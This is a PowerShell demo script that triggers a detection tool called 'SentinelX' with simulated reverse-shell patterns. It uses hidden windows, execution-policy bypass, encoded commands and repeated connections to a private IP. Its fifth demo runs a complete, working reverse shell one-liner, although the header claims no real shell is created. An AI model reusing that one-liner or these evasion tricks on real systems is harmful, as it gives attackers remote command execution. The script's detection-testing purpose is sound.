# Fast Reverse Shell Simulation Demo
# This script simulates a fast reverse shell connection attempt
# without actually creating a real reverse shell

Write-Host "========================================" -ForegroundColor Red
Write-Host "SentinelX Fast Reverse Shell Detection" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
Write-Host ""
Write-Host "This demo simulates a FAST reverse shell connection attempt" -ForegroundColor Yellow
Write-Host "that completes in seconds but still triggers detection." -ForegroundColor Yellow
Write-Host ""

$fakeIP = "192.168.1.100"  # Fake local IP for safety
$fakePort = 443

# Demo 1: PowerShell Reverse Shell Pattern (Fast)
Write-Host "[1] PowerShell Reverse Shell Pattern" -ForegroundColor Cyan
Write-Host "  Trigger: Command line pattern + network activity" -ForegroundColor Gray
Write-Host ""

# Simulate PowerShell reverse shell command pattern
$reverseShellScript = @"
Write-Host "Attempting reverse connection to $fakeIP`:$fakePort..."
try {
    `$tcpClient = New-Object System.Net.Sockets.TCPClient
    `$tcpClient.ConnectAsync("$fakeIP", $fakePort) | Out-Null
    Write-Host "Connection failed (expected - fake IP)"
} catch {
    Write-Host "Connection failed (fake IP): `$_"
}
"@

$tempScript = Join-Path $env:TEMP "reverse_shell_demo.ps1"
Set-Content -Path $tempScript -Value $reverseShellScript

Write-Host "  Running fast reverse shell simulation..." -ForegroundColor Yellow
Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", $tempScript -WindowStyle Hidden -Wait
Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
Write-Host "  Completed in less than 2 seconds!" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 1

# Demo 2: Netcat-like Connection Attempt
Write-Host "[2] Netcat Connection Attempt" -ForegroundColor Cyan
Write-Host "  Trigger: Network connection patterns" -ForegroundColor Gray
Write-Host ""

Write-Host "  Simulating netcat connection to $fakeIP`:$fakePort..." -ForegroundColor Yellow
try {
    $socket = New-Object System.Net.Sockets.TCPClient
    $socket.ConnectAsync($fakeIP, $fakePort) | Out-Null
} catch {}
Write-Host "  Connection attempt completed!" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 1

# Demo 3: Encoded Reverse Shell Command
Write-Host "[3] Encoded Reverse Shell Command" -ForegroundColor Cyan
Write-Host "  Trigger: Encoded command + network activity" -ForegroundColor Gray
Write-Host ""

$reverseCmd = "`$tcp=New-Object Net.Sockets.TCPClient('$fakeIP',$fakePort);Write-Host 'Connected'"
$encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($reverseCmd))

Write-Host "  Running encoded reverse shell command..." -ForegroundColor Yellow
Start-Process powershell.exe -ArgumentList "-NoProfile", "-EncodedCommand", $encodedCmd -WindowStyle Hidden -Wait
Write-Host "  Encoded command executed!" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 1

# Demo 4: Multiple Connection Attempts
Write-Host "[4] Multiple Connection Attempts" -ForegroundColor Cyan
Write-Host "  Trigger: High network activity" -ForegroundColor Gray
Write-Host ""

Write-Host "  Making 8 fast connection attempts..." -ForegroundColor Yellow
for ($i = 0; $i -lt 8; $i++) {
    try {
        $s = New-Object System.Net.Sockets.TCPClient
        $s.ConnectAsync($fakeIP, ($fakePort + $i)) | Out-Null
    } catch {}
    Start-Sleep -Milliseconds 100
}
Write-Host "  Completed all connection attempts!" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 1

# Demo 5: Suspicious Command Line Pattern
Write-Host "[5] Command Line Pattern Detection" -ForegroundColor Cyan
Write-Host "  Trigger: Command line pattern matching" -ForegroundColor Gray
Write-Host ""

Write-Host "  Running suspicious command line..." -ForegroundColor Yellow
$command = "powershell -NoProfile -ep bypass -c `$c=New-Object Net.Sockets.TCPClient('$fakeIP',$fakePort);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$o=(iex `$d 2>&1 | Out-String);`$e=[Text.Encoding]::ASCII.GetBytes(`$o);`$s.Write(`$e,0,`$e.Length)}"
Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", $command -WindowStyle Hidden -Wait
Write-Host "  Command executed!" -ForegroundColor Green
Write-Host ""

Write-Host "========================================" -ForegroundColor Red
Write-Host "DETECTION EXPECTATIONS:" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Red
Write-Host ""
Write-Host "SentinelX should detect these patterns:" -ForegroundColor White
Write-Host "• Encoded PowerShell command" -ForegroundColor Yellow
Write-Host "• PowerShell no profile" -ForegroundColor Yellow
Write-Host "• Execution policy bypass" -ForegroundColor Yellow
Write-Host "• Network connection attempts" -ForegroundColor Yellow
Write-Host "• High network activity (multiple connections)" -ForegroundColor Yellow
Write-Host ""
Write-Host "Expected Suspicion Scores:" -ForegroundColor White
Write-Host "• Individual commands: 3-5 points" -ForegroundColor Yellow
Write-Host "• Multi-indicator commands: 8-12 points" -ForegroundColor Yellow
Write-Host ""
Write-Host "All detections happen INSTANTLY when the process starts!" -ForegroundColor Green
Write-Host ""
Write-Host "Check SentinelX dashboard for real-time alerts!" -ForegroundColor Green
Write-Host "Investigations will appear within seconds of execution!" -ForegroundColor Yellow
Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "DEMO COMPLETED!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Red